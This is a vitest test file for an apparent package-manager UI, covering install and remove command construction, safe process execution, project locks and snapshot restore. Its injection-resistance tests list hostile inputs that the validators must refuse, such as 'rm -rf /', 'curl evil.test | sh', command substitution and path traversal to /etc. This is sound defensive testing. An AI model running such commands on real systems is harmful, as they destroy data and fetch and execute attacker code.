import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import {
  buildCommand,
  buildInstallCommand,
  isValidPackageName,
  isValidVersion,
} from '../src/server/core/commands.ts'
import { runCommand, withProjectLock } from '../src/server/core/exec.ts'
import type { PackageManager } from '../src/shared/types.ts'

describe('command construction', () => {
  it.each([
    ['npm', 'install vue@3.5.13'],
    ['pnpm', 'add vue@3.5.13'],
    ['yarn', 'add vue@3.5.13'],
    ['bun', 'add vue@3.5.13'],
  ])('builds an upgrade for %s', (pm, expected) => {
    const built = buildCommand(pm as PackageManager, {
      action: 'upgrade',
      name: 'vue',
      version: '3.5.13',
      kind: 'prod',
    })
    expect(built.display).toBe(`${pm} ${expected}`)
  })

  it.each([
    ['npm', 'uninstall vue'],
    ['pnpm', 'remove vue'],
    ['yarn', 'remove vue'],
    ['bun', 'remove vue'],
  ])('builds a removal for %s', (pm, expected) => {
    const built = buildCommand(pm as PackageManager, { action: 'remove', name: 'vue', kind: 'prod' })
    expect(built.display).toBe(`${pm} ${expected}`)
  })

  it('keeps a devDependency in devDependencies', () => {
    expect(
      buildCommand('npm', { action: 'upgrade', name: 'vite', version: '8.0.0', kind: 'dev' })
        .display,
    ).toBe('npm install vite@8.0.0 --save-dev')
    expect(
      buildCommand('pnpm', { action: 'upgrade', name: 'vite', version: '8.0.0', kind: 'dev' })
        .display,
    ).toBe('pnpm add vite@8.0.0 -D')
  })

  it('keeps optional and peer dependencies in their own field', () => {
    expect(
      buildCommand('npm', { action: 'upgrade', name: 'x', version: '1.0.0', kind: 'optional' })
        .args,
    ).toContain('--save-optional')
    expect(
      buildCommand('pnpm', { action: 'upgrade', name: 'x', version: '1.0.0', kind: 'peer' }).args,
    ).toContain('--save-peer')
  })

  it('handles scoped packages', () => {
    const built = buildCommand('pnpm', {
      action: 'upgrade',
      name: '@vitejs/plugin-vue',
      version: '6.0.9',
      kind: 'dev',
    })
    expect(built.args).toContain('@vitejs/plugin-vue@6.0.9')
  })

  it('builds a plain install for rollback', () => {
    expect(buildInstallCommand('yarn').display).toBe('yarn install')
  })
})

describe('command construction — injection resistance', () => {
  it.each([
    'vue; rm -rf /',
    'vue && curl evil.test | sh',
    'vue`whoami`',
    'vue$(whoami)',
    '../../etc/passwd',
    '-rf',
    '-D',
    '--registry=http://evil.test',
    '@-evil/pkg',
    'vue\nrm -rf /',
    '',
  ])('refuses the package name %j', (name) => {
    expect(isValidPackageName(name)).toBe(false)
    expect(() =>
      buildCommand('npm', { action: 'upgrade', name, version: '1.0.0', kind: 'prod' }),
    ).toThrow()
  })

  it.each([
    '1.0.0; rm -rf /',
    '$(whoami)',
    '--registry=http://evil.test',
    'file:../../../etc',
    'http://evil.test/pkg.tgz',
  ])('refuses the version %j', (version) => {
    expect(isValidVersion(version)).toBe(false)
    expect(() =>
      buildCommand('npm', { action: 'upgrade', name: 'vue', version, kind: 'prod' }),
    ).toThrow()
  })

  it('accepts real versions and ordinary dist-tags', () => {
    for (const version of ['1.0.0', '3.5.13', '2.0.0-beta.1', 'latest', 'next']) {
      expect(isValidVersion(version)).toBe(true)
    }
  })

  it('accepts ordinary and scoped package names', () => {
    for (const name of ['vue', 'vue-router', '@scope/pkg', 'lodash.merge', 'a']) {
      expect(isValidPackageName(name)).toBe(true)
    }
  })

  it('passes arguments as an array, never as a shell string', () => {
    const built = buildCommand('npm', {
      action: 'upgrade',
      name: 'vue',
      version: '3.5.13',
      kind: 'prod',
    })
    expect(Array.isArray(built.args)).toBe(true)
    expect(built.command).toBe('npm')
  })
})

describe('process execution', () => {
  let projectPath: string

  beforeEach(async () => {
    projectPath = await mkdtemp(join(tmpdir(), 'packui-exec-'))
  })

  afterEach(async () => {
    await rm(projectPath, { recursive: true, force: true })
  })

  it('streams stdout and reports the exit code', async () => {
    const chunks: string[] = []
    const result = await runCommand(
      projectPath,
      { command: 'node', args: ['-e', 'console.log("hello")'], display: 'node' },
      (event) => chunks.push(event.text),
    )

    expect(result.code).toBe(0)
    expect(chunks.join('')).toContain('hello')
  })

  it('reports a non-zero exit code rather than throwing', async () => {
    const result = await runCommand(
      projectPath,
      { command: 'node', args: ['-e', 'process.exit(3)'], display: 'node' },
      () => {},
    )
    expect(result.code).toBe(3)
    expect(result.error).toBeNull()
  })

  it('does not interpret shell metacharacters in arguments', async () => {
    const chunks: string[] = []
    await runCommand(
      projectPath,
      { command: 'node', args: ['-e', 'console.log(process.argv[1])', '; echo pwned'], display: 'x' },
      (event) => chunks.push(event.text),
    )
    // The metacharacters arrive as a literal argument; no second command runs.
    expect(chunks.join('')).toContain('; echo pwned')
    expect(chunks.join('')).not.toMatch(/^pwned$/m)
  })

  it('reports a missing executable clearly', async () => {
    const result = await runCommand(
      projectPath,
      { command: 'definitely-not-a-real-binary', args: [], display: 'x' },
      () => {},
    )
    expect(result.error).toContain('not installed or not on PATH')
  })
})

describe('project lock', () => {
  it('refuses a second mutation while one is running', async () => {
    let release: () => void = () => {}
    const blocker = new Promise<void>((resolve) => {
      release = resolve
    })

    const first = withProjectLock('/some/project', async () => {
      await blocker
      return 'first'
    })

    await expect(
      withProjectLock('/some/project', async () => 'second'),
    ).rejects.toThrow('Another change is already running')

    release()
    await expect(first).resolves.toBe('first')
  })

  it('releases the lock when the work throws', async () => {
    await expect(
      withProjectLock('/other/project', async () => {
        throw new Error('boom')
      }),
    ).rejects.toThrow('boom')

    await expect(withProjectLock('/other/project', async () => 'ok')).resolves.toBe('ok')
  })

  it('locks per project, not globally', async () => {
    let release: () => void = () => {}
    const blocker = new Promise<void>((resolve) => {
      release = resolve
    })

    const a = withProjectLock('/project-a', async () => {
      await blocker
      return 'a'
    })
    await expect(withProjectLock('/project-b', async () => 'b')).resolves.toBe('b')

    release()
    await expect(a).resolves.toBe('a')
  })
})

describe('snapshots', () => {
  let home: string
  let projectPath: string
  const originalHome = process.env.HOME

  beforeEach(async () => {
    home = await mkdtemp(join(tmpdir(), 'packui-home-'))
    projectPath = await mkdtemp(join(tmpdir(), 'packui-proj-'))
    process.env.HOME = home
  })

  afterEach(async () => {
    process.env.HOME = originalHome
    await rm(home, { recursive: true, force: true })
    await rm(projectPath, { recursive: true, force: true })
  })

  async function freshBackupModule() {
    // The cache module resolves ~/.packui at import time, so it is re-imported
    // after HOME has been redirected.
    const { resetModules } = await import('vitest').then((m) => ({ resetModules: m.vi.resetModules }))
    resetModules()
    return import('../src/server/core/backup.ts')
  }

  it('captures package.json and the lockfile, and restores both', async () => {
    const { createSnapshot, restoreSnapshot } = await freshBackupModule()

    await writeFile(join(projectPath, 'package.json'), '{"name":"before"}', 'utf8')
    await writeFile(join(projectPath, 'package-lock.json'), '{"v":1}', 'utf8')

    const snapshot = await createSnapshot(projectPath, 'test')
    expect(snapshot.files).toEqual(
      expect.arrayContaining(['package.json', 'package-lock.json']),
    )

    await writeFile(join(projectPath, 'package.json'), '{"name":"after"}', 'utf8')
    await writeFile(join(projectPath, 'package-lock.json'), '{"v":2}', 'utf8')

    await restoreSnapshot(projectPath, snapshot.id)

    expect(await readFile(join(projectPath, 'package.json'), 'utf8')).toBe('{"name":"before"}')
    expect(await readFile(join(projectPath, 'package-lock.json'), 'utf8')).toBe('{"v":1}')
  })

  it('removes a lockfile that did not exist when the snapshot was taken', async () => {
    const { createSnapshot, restoreSnapshot } = await freshBackupModule()

    await writeFile(join(projectPath, 'package.json'), '{"name":"x"}', 'utf8')
    const snapshot = await createSnapshot(projectPath, 'test')

    // As if a package manager created a lockfile during the failed mutation.
    await writeFile(join(projectPath, 'package-lock.json'), '{"v":1}', 'utf8')
    await restoreSnapshot(projectPath, snapshot.id)

    await expect(readFile(join(projectPath, 'package-lock.json'), 'utf8')).rejects.toThrow()
  })

  it('rejects a snapshot id that is not on disk', async () => {
    const { createSnapshot, restoreSnapshot } = await freshBackupModule()
    await writeFile(join(projectPath, 'package.json'), '{}', 'utf8')
    await createSnapshot(projectPath, 'test')

    await expect(restoreSnapshot(projectPath, '../../../etc')).rejects.toThrow('Unknown snapshot')
    await expect(restoreSnapshot(projectPath, 'nope')).rejects.toThrow('Unknown snapshot')
  })

  it('refuses to snapshot a directory with no package.json', async () => {
    const { createSnapshot } = await freshBackupModule()
    await expect(createSnapshot(projectPath, 'test')).rejects.toThrow('Nothing to back up')
  })

  it('lists snapshots newest first', async () => {
    const { createSnapshot, listSnapshots } = await freshBackupModule()
    await writeFile(join(projectPath, 'package.json'), '{}', 'utf8')

    const first = await createSnapshot(projectPath, 'one')
    await new Promise((resolve) => setTimeout(resolve, 5))
    const second = await createSnapshot(projectPath, 'two')

    const listed = await listSnapshots(projectPath)
    expect(listed[0]?.id).toBe(second.id)
    expect(listed.map((s) => s.id)).toContain(first.id)
  })
})
